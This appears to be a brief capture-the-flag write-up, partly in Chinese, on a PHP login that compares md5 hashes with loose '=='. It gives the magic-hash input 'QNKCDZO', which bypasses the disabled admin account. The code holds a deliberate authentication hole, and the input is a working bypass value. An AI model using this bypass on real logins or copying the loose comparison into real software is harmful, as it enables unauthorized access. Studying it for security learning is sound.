admin 7
===

```php
if($_POST['name'] == 'admin' && md5($_POST['password']) == '00000000000000000000000000000000') {
    // admin account is disabled by give a impossible md5 hash
    $user = 'admin';
} elseif($_POST['name'] == 'guest' && md5($_POST['password']) == '084e0343a0486ff05530df6c705c8bb4') {
    $user = 'guest';
} elseif(isset($_POST['name'])) {
    $user = false;
}
```

關鍵點在於使用 `==` 而非 `===`，所以存在弱判斷。

```
md5(QNKCDZO) = 0e830400451993494058024219903391
```